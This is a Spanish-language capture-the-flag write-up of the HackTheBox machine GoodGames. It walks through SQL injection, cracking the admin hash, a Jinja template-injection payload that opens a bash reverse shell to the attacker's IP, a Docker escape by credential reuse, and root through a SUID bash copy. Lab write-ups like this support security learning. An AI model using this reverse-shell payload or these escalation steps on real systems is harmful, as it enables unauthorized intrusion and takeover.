Propiedades:
- OS: Linux
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #ssti #sqli #docker #password-cracking

![](assets/Pasted%20image%2020251213231140.png)

## Reconocimiento

Tiro un ping para comprobar conectividad.

```bash
> ping -c 1 10.129.6.67
---------------------------------------------------------
PING 10.129.6.67 (10.129.6.67) 56(84) bytes of data.
64 bytes from 10.129.6.67: icmp_seq=1 ttl=63 time=110 ms

--- 10.129.6.67 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 109.678/109.678/109.678/0.000 ms
```

Realizo un escaneo con nmap para que ver puertos tenemos abiertos.

```bash
> sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.6.67
------------------------------------------------------------
Scanned at 2025-12-13 23:12:52 CST for 14s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 6
```

- Vemos el puerto 80 abierto.

Sobre el puerto 80 realizo un segundo con nmap para detectar versiones, servicios y correr un conjunto de scripts de reconocimiento.

```bash
> sudo nmap -p 80 -sV -sC -Pn -n -sS --min-rate 5000 -vvv 10.129.6.67 -oN target
----------------------------------------------------------------------------------
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.48
|_http-title: GoodGames | Community and Store
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb
```

- Puerto 80 HTTP Apache httpd 2.4.48
## Enumeración


**Puerto 80 HTTP**

- Al parecer es una pagina de blogs:
- Al parecer existen 3 usuarios que crean posts, Wolfenstein, Hitman y Witch Murder

![](assets/Pasted%20image%2020251213233210.png)

**Whatweb.**

Identificamos las tecnologías web de la pagina y vemos que corre con `Werkzeug/2.0.2 Python/3.9.2` 

```bash
> whatweb http://goodgames.htb/
http://goodgames.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.9.2], IP[10.129.6.67], JQuery, Meta-Author[_nK], PasswordField[password], Python[3.9.2], Script, Title[GoodGames | Community and Store], Werkzeug[2.0.2], X-UA-Compatible[IE=edge]
```

**Fuzzing.**

Aplicamos Fuzzing para ver que directorios existen en la web.

```bash
> ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.129.6.67/FUZZ -fl 267 -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.6.67/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 267
________________________________________________

                        [Status: 200, Size: 85107, Words: 29274, Lines: 1735, Duration: 114ms]
blog                    [Status: 200, Size: 44212, Words: 15590, Lines: 909, Duration: 137ms]
signup                  [Status: 200, Size: 33387, Words: 11042, Lines: 728, Duration: 116ms]
logout                  [Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 112ms]
forgot-password         [Status: 200, Size: 32744, Words: 10608, Lines: 730, Duration: 110ms]
coming-soon             [Status: 200, Size: 10524, Words: 2489, Lines: 287, Duration: 127ms]
                        [Status: 200, Size: 85107, Words: 29274, Lines: 1735, Duration: 116ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 109ms]
```

**signup/**

- En esta tab es donde nos registramos como usuario

![](assets/Pasted%20image%2020251213234405.png)

## Explotación SQLi


La tab `signup/` era vulnerable a `SQLi` lo primero que hice fue detectar la base de datos que estaba en uso la cual se llamaba `main`.


- Saque todas las tablas de la base de datos `main`.

![](assets/Pasted%20image%2020251214004620.png)

- La tabla que me interesa es la de `user` por lo cual decidí listar sus columnas.

![](assets/Pasted%20image%2020251214004830.png)

- Me interesan las columnas email y password por lo cual decidí volcar todo el contenido

![](assets/Pasted%20image%2020251214004917.png)

Aqui es donde me encuentro al usuario admin y su hash.

```bash
admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec
```

El hash consiste de 32 caracteres que corresponde a `MD5`.

- Crackeo el hash usando `hashcat`

```bash
> hashcat -a 0 -m 0 2b22337f218b2d82dfc3b6f77e7cb8ec /usr/share/wordlists/rockyou.txt
---------------------------------------------------------------------------------------
2b22337f218b2d82dfc3b6f77e7cb8ec:superadministrator       
                                                          
Session..........: hashcat
Status...........: Cracked
```

- Consigo las credenciales `admin@goodgames.htb:superadministrator`

Me logeo en la web y le doy al icono de settings.

![](assets/Pasted%20image%2020251214005316.png)


Al darle clic me redirigue a una pagina cuyo dominio es `internal-administration.goodgames.htb` el cual decido meter al `/etc/host`

```bash
> cat /etc/host
10.129.6.67 goodgames.htb internal-administration.goodgames.htb
```

## Explotación SSTI

Accedo con las credenciales anteriormente encontradas

- admin:superadministrator

![](assets/Pasted%20image%2020251214005449.png)

**WhatWeb.**

La pagina corre con `Python`

```bash
> whatweb http://internal-administration.goodgames.htb/index
http://internal-administration.goodgames.htb/index [403 Forbidden] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.6.7], IP[10.129.6.67], Meta-Author[Themesberg], Open-Graph-Protocol[website], Python[3.6.7], Script, Title[Flask Volt Dashboard -  Error 403  | AppSeed][Title element contains newline(s)!], Werkzeug[2.0.2]
```

Al saber que corre con `Python` lo primero que intento es un `SSTI` simple para ver si la web lo interpreta.

- Aqui veo que la web efectivamente me lo interpreta.

![](assets/Pasted%20image%2020251214001911.png)

Por lo cual ahora decido buscar algun payload para entablarme una reverse-shell.

- Primero me pongo en escucha por el puerto `4444`

```bash
> sudo nc -nlvp 4444
```

- Coloco el siguiente payload en la parte de full-name

```bash
{{ self.__init__.__globals__.__builtins__.__import__("os").popen("bash -c 'bash -i >& /dev/tcp/10.10.15.110/4444 0>&1'").read() }}
```

Recibo la conexión.

```bash
Connection received on 10.129.6.67 35446
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# whoami
whoami
root
root@3a453ab39d3d:/backend# id
id
uid=0(root) gid=0(root) groups=0(root)
root@3a453ab39d3d:/backend# 
```

## Escalada de Privilegios

Al parecer entre como root, lo cual se me hace muy raro.

```bash
root@3a453ab39d3d:/opt# id
id
uid=0(root) gid=0(root) groups=0(root)
root@3a453ab39d3d:/opt# whoami
whoami
root
```

Verifico mi IP para ver si estoy en la maquina real y me doy cuenta que estoy dentro de un `Docker` con ip  `172.19.0.2`

```bash
root@3a453ab39d3d:/opt# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Se que la IP del Host de Docker seguramente sea la `0.1` por lo cual realizo un escaneo de puertos con un script de bash.

- Aqui veo que el puerto 22 SSH de la maquina host esta abierto

```bash
root@3a453ab39d3d:~# for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null 
22 open 
80 open
```

Reutilice las mismas credenciales

- augustus:superadministrator

```bash
root@3a453ab39d3d:~# ssh augustus@172.19.0.1
```

Dentro de la maquina victima verifico mi ip para ver si estoy en la maquina victima.

- La ip es la correcta y estoy dentro de la maquina victima.

```bash
augustus@GoodGames:~# ip a
: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:a3:8b brd ff:ff:ff:ff:ff:ff
    inet 10.129.6.67/16 brd 10.129.255.255 scope global dynamic ens192
       valid_lft 3356sec preferred_lft 3356sec
    inet6 dead:beef::250:56ff:feb0:a38b/64 scope global dynamic mngtmpaddr 
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:feb0:a38b/64 scope link 
       valid_lft forever preferred_lft forever
```


Ok ahora tenemos 2 sesiones, una dentro del docker y otra en la maquina victima, las 2 tienen el mismo directorio home `/augustus` y al parecer cuando creo un archivo desde el docker en el directorio `/augustus` el archivo se crea con permisos de `root` por lo cual yo puedo crear una `bash` desde la maquina victima y cambiar los permisos a root desde el `docker`.

- Desde la maquina victima copio `/bin/bash` a mi directorio actual.

```bash
augustus@GoodGames:~$ cp /bin/bash .
cp /bin/bash .
```

- Desde el docker le coloco el bit `SUID` al archivo `bash` para poder ejecutarlo como root

```bash
root@3a453ab39d3d:/home/augustus# chown root:root bash 
chown root:root bash 
root@3a453ab39d3d:/home/augustus# chmod 4777 bash 
chmod 4777 bash 
root@3a453ab39d3d:/home/augustus# ls -la bash
ls -la
-rwsrwxrwx 1 root root 1168776 Dec 14 06:44 bash
```

Desde la maquina victima ejecuto mi copia de `bash`.

```bash
augustus@GoodGames:~$ ./bash -p
./bash -p
bash-5.0# id
id
uid=1000(augustus) gid=1000(augustus) euid=0(root) groups=1000(augustus)
bash-5.0# whoami
whoami
root
```

***PWNED***

![](assets/Pasted%20image%2020251214004648.png)